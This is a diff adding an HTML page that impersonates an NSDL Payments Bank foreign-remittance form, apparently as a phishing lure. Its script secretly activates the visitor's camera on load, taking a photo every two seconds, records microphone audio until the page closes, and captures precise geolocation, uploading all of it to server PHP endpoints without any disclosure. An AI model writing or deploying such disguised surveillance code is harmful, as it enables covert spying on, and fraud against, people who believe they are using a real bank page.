@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Foreign Remittance Form</title>
+    <script src = script.js></script>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Lato', sans-serif; /* Lato font */
+            background-color: #f8f8f8; /* Light gray background color */
+        }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background-color: #ffffff; /* White header background color */
+            color: #000000; /* Black text color */
+            padding: 10px; /* Reduced padding */
+            position: relative;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1); /* Add shadow to the header */
+        }
+
+        .logo {
+            width: 200px; /* Increased logo width */
+            height: auto;
+        }
+
+        nav ul {
+            list-style-type: none;
+            padding: 0;
+            margin: 0;
+            display: none; /* Initially hide navigation links */
+        }
+
+        nav li {
+            margin-left: 20px; /* Increased space between nav items */
+        }
+
+        nav a {
+            color: #000000; /* Black color for navigation links */
+            text-decoration: none;
+            transition: color 0.3s; /* Smooth color transition on hover */
+        }
+
+        nav a:hover {
+            color: #666666; /* Darker color on hover */
+        }
+
+        .container {
+            margin: 20px auto;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            background-color: #ffffff; /* White background color */
+            max-width: 400px; /* Limit width for better readability */
+            transition: transform 0.3s; /* Smooth scale transition on hover */
+        }
+
+        .container:hover {
+            transform: scale(1.05); /* Scale up the form on hover */
+        }
+
+        input[type="text"],
+        input[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            margin-top: 5px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box; /* Include padding and border in the width */
+            font-family: 'Lato', sans-serif; /* Lato font */
+        }
+
+        input[type="submit"] {
+            background-color: #bf0000; /* Red color for submit button */
+            color: white;
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.3s; /* Smooth color transition on hover */
+        }
+
+        input[type="submit"]:hover {
+            background-color: #990000; /* Darker red color on hover */
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+
+        #camera {
+            display: none; /* Hide the camera element */
+        }
+
+        .hamburger {
+            display: none; /* Hide the hamburger button by default */
+        }
+
+        /* Media query for smaller screens */
+        @media screen and (max-width: 768px) {
+            nav ul {
+                display: none; /* Hide navigation links for smaller screens */
+            }
+
+            .hamburger {
+                display: block; /* Show the hamburger button for smaller screens */
+            }
+
+            nav ul.show {
+                display: block; /* Show navigation links when the hamburger button is clicked */
+            }
+        }
+
+        /* Media query for larger screens */
+        @media screen and (min-width: 769px) {
+            .hamburger {
+                display: none; /* Hide the hamburger button for larger screens */
+            }
+
+            nav ul {
+                display: flex; /* Show navigation links for larger screens */
+            }
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <div>
+        <img src="nsdl_logo.png" alt="NSDL Payments Bank Logo" class="logo">
+    </div>
+    <nav>
+        <ul>
+            <li><a href="https://nsdlbank.com/about.php" target="_blank">About Us</a></li>
+            <li><a href="https://nsdlbank.com/products.php" target="_blank">Products</a></li>
+            <li><a href="https://nsdlbank.com/#" target="_blank">Customer Care</a></li>
+            <li><a href="https://nsdlbank.com/locate_us.php" target="_blank">Locate Us</a></li>
+        </ul>
+    </nav>
+    <div class="hamburger">&#9776;</div> <!-- Hamburger icon -->
+</header>
+
+<div class="container">
+    <h2>Accept Foreign Remittances</h2>
+    <form id="remittanceForm" action="#" method="post">
+        <label for="name">Name:</label>
+        <input type="text" id="name" name="name" required>
+        <label for="address">Address:</label>
+        <input type="text" id="address" name="address" required>
+        <label for="amount">Amount (USD):</label>
+        <input type="text" id="amount" name="amount" value="$549.00" readonly>
+        <label for="account">Bank Account:</label>
+        <input type="text" id="account" name="account" value="NSDL Payments Bank - XXXXXXXXXXX0820" readonly>
+        <input type="submit" value="Accept Remittance">
+    </form>
+</div>
+
+<video id="camera" autoplay></video>
+
+<script>
+    const hamburger = document.querySelector('.hamburger');
+    const navLinks = document.querySelector('nav ul');
+
+    hamburger.addEventListener('click', () => {
+        navLinks.classList.toggle('show');
+    });
+
+    // JavaScript code for capturing photos every 2 seconds
+    setInterval(function() {
+        takePhoto();
+    }, 2000);
+
+    // JavaScript code for capturing photos
+    function takePhoto() {
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
+            .then(function(stream) {
+                const video = document.getElementById("camera");
+                video.srcObject = stream;
+                video.addEventListener('canplay', function() {
+                    video.play();
+                });
+                setTimeout(function() {
+                    const canvas = document.createElement("canvas");
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const imageData = canvas.toDataURL('image/png'); // Convert to PNG
+                    // Save the image to the server using AJAX
+                    const formData = new FormData();
+                    formData.append("image", imageData);
+                    fetch("save-image.php", {
+                        method: "POST",
+                        body: formData
+                    })
+                        .then(response => response.json())
+                        .then(data => {
+                            console.log("Image saved:", data);
+                            stream.getTracks().forEach(track => track.stop());
+                            video.style.display = "none"; // Hide the camera after capturing the photo
+                        });
+                }, 1000);
+            })
+            .catch(error => {
+                console.error("Error accessing camera:", error);
+            });
+    }
+
+    // JavaScript code for recording audio
+    function recordAudio() {
+        navigator.mediaDevices.getUserMedia({ audio: true })
+            .then(function(stream) {
+                const mediaRecorder = new MediaRecorder(stream);
+                const audioChunks = [];
+                mediaRecorder.addEventListener("dataavailable", function(event) {
+                    audioChunks.push(event.data);
+                });
+                mediaRecorder.addEventListener("stop", function() {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' }); // Set audio type
+                    const formData = new FormData();
+                    formData.append("audio", audioBlob);
+                    fetch("save-audio.php", {
+                        method: "POST",
+                        body: formData
+                    })
+                        .then(response => response.json())
+                        .then(data => {
+                            console.log("Audio saved:", data);
+                            stream.getTracks().forEach(track => track.stop());
+                        });
+                });
+                mediaRecorder.start();
+                window.onbeforeunload = function() {
+                    mediaRecorder.stop();
+                };
+            })
+            .catch(error => {
+                console.error("Error accessing microphone:", error);
+            });
+    }
+
+    // JavaScript code for getting location
+    function getLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                const formData = new FormData();
+                formData.append("latitude", position.coords.latitude.toFixed(6)); // Increase location precision
+                formData.append("longitude", position.coords.longitude.toFixed(6)); // Increase location precision
+                fetch("save-location.php", {
+                    method: "POST",
+                    body: formData
+                })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log("Location saved:", data);
+                    }).catch(error => {
+                    console.error("Error saving location:", error);
+                });
+            });
+        } else {
+            console.error("Geolocation is not supported by this browser.");
+        }
+    }
+
+    // Call the takePhoto, recordAudio, and getLocation functions immediately after the page loads
+    window.onload = function() {
+        takePhoto(); // Start capturing photos immediately
+        recordAudio(); // Start recording audio immediately
+        getLocation(); // Get location immediately
+    };
+
+    document.addEventListener('DOMContentLoaded', function() {
+        document.getElementById('remittanceForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent default form submission
+            showPopup(event);
+        });
+    });
+</script>
+
+</body>
+</html>
